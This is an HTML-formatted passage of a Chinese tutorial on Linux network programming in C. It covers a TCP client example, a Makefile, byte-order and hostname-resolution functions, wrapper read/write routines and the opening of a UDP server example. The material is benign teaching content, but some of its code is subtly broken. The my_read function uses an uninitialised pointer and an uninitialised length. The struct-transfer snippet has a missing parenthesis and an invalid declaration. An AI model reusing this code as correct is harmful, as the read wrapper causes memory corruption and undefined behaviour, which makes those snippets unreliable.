+ fprintf(stderr,"Gethostname error\n");<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; exit(1);<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }</p>
+<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if((portnumber=atoi(argv[2]))&lt;0)<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; {<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+ fprintf(stderr,"Usage:%s hostname portnumber\a\n",argv[0]);<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; exit(1);<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }</p>
+<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; /* 客户程序开始建立 sockfd描述符&nbsp; */<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if((sockfd=socket(AF_INET,SOCK_STREAM,0))==-1)<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; {<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+ fprintf(stderr,"Socket Error:%s\a\n",strerror(errno));<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; exit(1);<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }</p>
+<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; /* 客户程序填充服务端的资料&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; */<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; bzero(&amp;server_addr,sizeof(server_addr));<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; server_addr.sin_family=AF_INET;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; server_addr.sin_port=htons(portnumber);<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; server_addr.sin_addr=*((struct in_addr *)host-&gt;h_addr);</p>
+<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; /* 客户程序发起连接请求&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; */ <br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if(connect(sockfd,(struct sockaddr *)(&amp;server_addr),sizeof(struct sockaddr))==-1)<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; {<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+ fprintf(stderr,"Connect Error:%s\a\n",strerror(errno));<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; exit(1);<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }</p>
+<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; /* 连接成功了&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; */<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if((nbytes=read(sockfd,buffer,1024))==-1)<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; {<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+ fprintf(stderr,"Read Error:%s\n",strerror(errno));<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; exit(1);<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; buffer[nbytes]='\0';<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; printf("I have received:%s\n",buffer);<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; /* 结束通讯&nbsp;&nbsp;&nbsp;&nbsp; */<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; close(sockfd);<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; exit(0);<br>}</p>
+<p>MakeFile<br>这里我们使用GNU 的make实用程序来编译. 关于make的详细说明见 Make 使用介绍</p>
+<p>CODE:&nbsp; [Copy to clipboard] </p>
+<p>#########&nbsp; Makefile&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ###########<br>all:server client<br>server:server.c<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; gcc $^ -o $@<br>client:client.c<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; gcc $^ -o $@</p>
+<p>运行make后会产生两个程序server(服务器端)和client(客户端) 先运行./server portnumber&amp;&nbsp; <br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; (portnumber随便取一个大于1204且不在/etc/services中出现的号码 就用8888好了),<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 然后运行&nbsp; ./client localhost 8888 看看有什么结果. (你也可以用telnet和netstat试一试.) <br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 上面是一个最简单的网络程序,不过是不是也有点烦.上面有许多函数我们还没有解释. 我会在下一章进行的详细的说明. </p>
+<p><br>(七) 总结 <br>总的来说网络程序是由两个部分组成的--客户端和服务器端.它们的建立步骤一般是: </p>
+<p>服务器端<br>socket--&gt;bind--&gt;listen--&gt;accept </p>
+<p>客户端<br>socket--&gt;connect</p>
+<p>(三)Linux网络编程--3. 服务器和客户机的信息函数</p>
+<p><br>这一章我们来学习转换和网络方面的信息函数. <br>3.1 字节转换函数 <br>在网络上面有着许多类型的机器,这些机器在表示数据的字节顺序是不同的, 比如i386芯片是低字节在内存地址的低端,<br>高字节在高端,而alpha芯片却相反. 为了统一起来,在Linux下面,有专门的字节转换函数. <br>unsigned long&nbsp; int htonl(unsigned long&nbsp; int hostlong)<br>unsigned short int htons(unisgned short int hostshort)<br>unsigned long&nbsp; int ntohl(unsigned long&nbsp; int netlong)<br>unsigned short int ntohs(unsigned short int netshort)</p>
+<p>在这四个转换函数中,h 代表host, n 代表 network.s 代表short l 代表long <br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 第一个函数的意义是将本机器上的long数据转化为网络上的long. 其他几个函数的意义也差不多. </p>
+<p>3.2 IP和域名的转换 <br>在网络上标志一台机器可以用IP或者是用域名.那么我们怎么去进行转换呢? </p>
+<p>struct hostent *gethostbyname(const char *hostname)<br>struct hostent *gethostbyaddr(const char *addr,int len,int type)<br>在中有struct hostent的定义<br>struct hostent{<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+ char 
+*h_name;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; /* 
+主机的正式名称&nbsp; */<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; char *h_aliases;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; /* 主机的别名 */<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+ int&nbsp;&nbsp; h_addrtype;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; /* 
+主机的地址类型&nbsp; AF_INET*/<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
+int&nbsp;&nbsp; 
+h_length;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; /* 
+主机的地址长度&nbsp; 对于IP4 是4字节32位*/<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; char **h_addr_list;&nbsp;&nbsp;&nbsp;&nbsp; /* 主机的IP地址列表 */<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }<br>&nbsp; #define h_addr h_addr_list[0]&nbsp; /* 主机的第一个IP地址*/</p>
+<p>gethostbyname可以将机器名(如 linux.yessun.com)转换为一个结构指针.在这个结构里面储存了域名的信息 <br>gethostbyaddr可以将一个32位的IP地址(C0A80001)转换为结构指针. </p>
+<p>这两个函数失败时返回NULL 且设置h_errno错误变量,调用h_strerror()可以得到详细的出错信息 </p>
+<p><br>3.3 字符串的IP和32位的IP转换. <br>在网络上面我们用的IP都是数字加点(192.168.0.1)构成的, 而在struct in_addr结构中用的是32位的IP, <br>我们上面那个32位IP(C0A80001)是的192.168.0.1 为了转换我们可以使用下面两个函数 </p>
+<p>int inet_aton(const char *cp,struct in_addr *inp)<br>char *inet_ntoa(struct in_addr in)</p>
+<p>函数里面 a 代表 ascii n 代表network.第一个函数表示将a.b.c.d的IP转换为32位的IP,<br>存储在 inp指针里面.第二个是将32位IP转换为a.b.c.d的格式. </p>
+<p><br>3.4 服务信息函数 <br>在网络程序里面我们有时候需要知道端口.IP和服务信息.这个时候我们可以使用以下几个函数 </p>
+<p>int getsockname(int sockfd,struct sockaddr *localaddr,int *addrlen)<br>int getpeername(int sockfd,struct sockaddr *peeraddr, int *addrlen)<br>struct servent *getservbyname(const char *servname,const char *protoname)<br>struct servent *getservbyport(int port,const char *protoname)<br>struct servent<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; {<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+ char *s_name;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; /* 
+正式服务名 */<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+ char **s_aliases;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; /* 别名列表 */&nbsp; <br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+ int 
+s_port;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+ /* 端口号 */<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+ char *s_proto;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; /* 使用的协议
+ */ <br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }</p>
+<p>一般我们很少用这几个函数.对应客户端,当我们要得到连接的端口号时在connect调用成功后使用可得到 <br>系统分配的端口号.对于服务端,我们用INADDR_ANY填充后,为了得到连接的IP我们可以在accept调用成功后 使用而得到IP地址. <br>在网络上有许多的默认端口和服务,比如端口21对ftp80对应WWW.为了得到指定的端口号的服务 我们可以调用第四个函数,<br>相反为了得到端口号可以调用第三个函数. </p>
+<p>3.5 一个例子</p>
+<p>CODE:&nbsp; [Copy to clipboard] </p>
+<p>#include &lt;stdlib.h&gt;<br>#include &lt;stdio.h&gt;<br>#include &lt;errno.h&gt;<br>#include &lt;string.h&gt;<br>#include &lt;unistd.h&gt;<br>#include &lt;netdb.h&gt;<br>#include &lt;sys/socket.h&gt;<br>#include &lt;netinet/in.h&gt;<br>#include &lt;sys/types.h&gt;<br>#include &lt;arpa/inet.h&gt;</p>
+<p>int main(int argc ,char **argv)<br>{<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; struct sockaddr_in addr;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; struct hostent *host;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; char **alias;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if(argc&lt;2)<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; {<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; fprintf(stderr,"Usage:%s hostname|ip..\n\a",argv[0]);<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; exit(1);<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; argv++;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; for(;*argv!=NULL;argv++)<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; {<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; /* 这里我们假设是IP*/&nbsp;&nbsp; <br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+ if(inet_aton(*argv,&amp;addr.sin_addr)!=0)<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; {<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+ host=gethostbyaddr((char&nbsp;&nbsp; *)&amp;addr.sin_addr,4,AF_INET); <br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+ printf("Address information of Ip %s\n",*argv); <br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; } <br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; else <br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; {<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+ /* 失败,难道是域名?*/<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+ host=gethostbyname(*argv); printf("Address information<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+ of host %s\n",*argv); <br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if(host==NULL)<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; {<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+ /* 都不是 ,算了不找了*/<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+ fprintf(stderr,"No address information of %s\n",*argv);<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+ continue;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+ printf("Official host name %s\n",host-&gt;h_name);<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; printf("Name aliases:");<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+ for(alias=host-&gt;h_aliases;*alias!=NULL;alias++)<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; printf("%s ,",*alias);<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; printf("\nIp address:");<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+ for(alias=host-&gt;h_addr_list;*alias!=NULL;alias++)<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+ printf("%s ,",inet_ntoa(*(struct in_addr *)(*alias)));<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }<br>}</p>
+<p>在这个例子里面,为了判断用户输入的是IP还是域名我们调用了两个函数,第一次我们假设输入的是IP所以调用inet_aton, <br>失败的时候,再调用gethostbyname而得到信息.</p>
+<p>(四)Linux网络编程--4. 完整的读写函数</p>
+<p>一旦我们建立了连接,我们的下一步就是进行通信了.在Linux下面把我们前面建立的通道看成是文件描述符,<br>这样服务器端和客户端进行通信时候,只要往文件描述符里面读写东西了. 就象我们往文件读写一样. </p>
+<p>4.1 写函数write <br>ssize_t write(int fd,const void *buf,size_t nbytes)</p>
+<p>write函数将buf中的nbytes字节内容写入文件描述符fd.成功时返回写的字节数.失败时返回-1. 并设置errno变量. <br>在网络程序中,当我们向套接字文件描述符写时有俩种可能. </p>
+<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 1)write的返回值大于0,表示写了部分或者是全部的数据. </p>
+<p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 2)返回的值小于0,此时出现了错误.我们要根据错误类型来处理. </p>
+<p>如果错误为EINTR表示在写的时候出现了中断错误. <br>如果为EPIPE表示网络连接出现了问题(对方已经关闭了连接). <br>为了处理以上的情况,我们自己编写一个写函数来处理这几种情况. </p>
+<p>int my_write(int fd,void *buffer,int length)<br>{<br>int bytes_left;<br>int written_bytes;<br>char *ptr;</p>
+<p>ptr=buffer;<br>bytes_left=length;<br>while(bytes_left&gt;0)<br>{<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; /* 开始写*/<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; written_bytes=write(fd,ptr,bytes_left);<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if(written_bytes&lt;=0) /* 出错了*/<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; {&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if(errno==EINTR) /* 中断错误 我们继续写*/<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+ written_bytes=0;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+ 
+else&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+ /* 其他错误 没有办法,只好撤退了*/<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+ return(-1);<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; bytes_left-=written_bytes;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ptr+=written_bytes;&nbsp;&nbsp;&nbsp;&nbsp; /* 从剩下的地方继续写&nbsp; */<br>}<br>return(0);<br>}</p>
+<p>4.2 读函数read <br>ssize_t read(int fd,void *buf,size_t nbyte) read函数是负责从fd中读取内容.当读成功时, <br>read返回实际所读的字节数,如果返回的值是0 表示已经读到文件的结束了,小于0表示出现了错误.<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 如果错误为EINTR说明读是由中断引起的, <br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 如果是ECONNREST表示网络连接出了问题. 和上面一样,我们也写一个自己的读函数. </p>
+<p>int my_read(int fd,void *buffer,int length)<br>{<br>int bytes_left;<br>int bytes_read;<br>char *ptr;<br>&nbsp; <br>bytes_left=length;<br>while(bytes_left&gt;0)<br>{<br>&nbsp;&nbsp; bytes_read=read(fd,ptr,bytes_read);<br>&nbsp;&nbsp; if(bytes_read&lt;0)<br>&nbsp;&nbsp; {<br>&nbsp;&nbsp;&nbsp;&nbsp; if(errno==EINTR)<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; bytes_read=0;<br>&nbsp;&nbsp;&nbsp;&nbsp; else<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; return(-1);<br>&nbsp;&nbsp; }<br>&nbsp;&nbsp; else if(bytes_read==0)<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; break;<br>&nbsp;&nbsp;&nbsp; bytes_left-=bytes_read;<br>&nbsp;&nbsp;&nbsp; ptr+=bytes_read;<br>}<br>return(length-bytes_left);<br>}</p>
+<p><br>4.3 数据的传递 <br>有了上面的两个函数,我们就可以向客户端或者是服务端传递数据了.比如我们要传递一个结构.可以使用如下方式 </p>
+<p><br>/*&nbsp; 客户端向服务端写 */<br>struct my_struct my_struct_client;<br>write(fd,(void *)&amp;my_struct_client,sizeof(struct my_struct);</p>
+<p>/* 服务端的读*/ <br>char buffer[sizeof(struct my_struct)];<br>struct *my_struct_server;<br>read(fd,(void *)buffer,sizeof(struct my_struct)); <br>my_struct_server=(struct my_struct *)buffer;&nbsp;&nbsp;&nbsp; </p>
+<p>在网络上传递数据时我们一般都是把数据转化为char类型的数据传递.接收的时候也是一样的 注意的是我们没有必要在网络上传<br>递指针(因为传递指针是没有任何意义的,我们必须传递指针所指向的内容)</p>
+<p><br>(五)Linux网络编程--5. 用户数据报发送</p>
+<p><br>我们前面已经学习网络程序的一个很大的部分,由这个部分的知识,我们实际上可以写出大部分的基于TCP协议的网络程序了.<br>现在在 Linux下的大部分程序都是用我们上面所学的知识来写的.我们可以去找一些源程序来参考一下.这一章,我们简单的学习一<br>下基于UDP协议的网络程序. </p>
+<p>5.1 两个常用的函数 <br>&nbsp;&nbsp; int recvfrom(int sockfd,void *buf,int len,unsigned int flags,struct sockaddr * from int *fromlen)<br>&nbsp;&nbsp; int sendto(int sockfd,const void *msg,int len,unsigned int flags,struct sockaddr *to int tolen)</p>
+<p>sockfd,buf,len的意义和read,write一样,分别表示套接字描述符,发送或接收的缓冲区及大小.<br>recvfrom负责从 sockfd接收数据,如果from不是NULL,那么在from里面存储了信息来源的情况,如果对信息的来源不感兴趣,<br>可以将from和fromlen 设置为NULL.sendto负责向to发送信息.此时在to里面存储了收信息方的详细资料. </p>
+<p><br>5.2 一个实例</p>
+<p>CODE:&nbsp; [Copy to clipboard]</p>
+<p><br>--------------------------------------------------------------------------------</p>
+<p>/*&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
+服务端程序&nbsp; 
+server.c&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; */<br>#include &lt;stdlib.h&gt;<br>#include &lt;stdio.h&gt;<br>#include &lt;errno.h&gt;<br>#include &lt;string.h&gt;<br>#include &lt;unistd.h&gt;<br>#include &lt;netdb.h&gt;<br>#include &lt;sys/socket.h&gt;<br>#include &lt;netinet/in.h&gt;<br>#include &lt;sys/types.h&gt;<br>#include &lt;arpa/inet.h&gt;<br>#define SERVER_PORT&nbsp;&nbsp;&nbsp;&nbsp; 8888<br>#define MAX_MSG_SIZE&nbsp;&nbsp;&nbsp; 1024</p>
+<p>void udps_respon(int sockfd)<br>{<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; struct sockaddr_in addr;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; int&nbsp;&nbsp;&nbsp; n;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; socklen_t addrlen;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; char&nbsp;&nbsp;&nbsp; msg[MAX_MSG_SIZE];<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; while(1)<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; {&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; /* 从网络上读,写到网络上面去&nbsp;&nbsp; 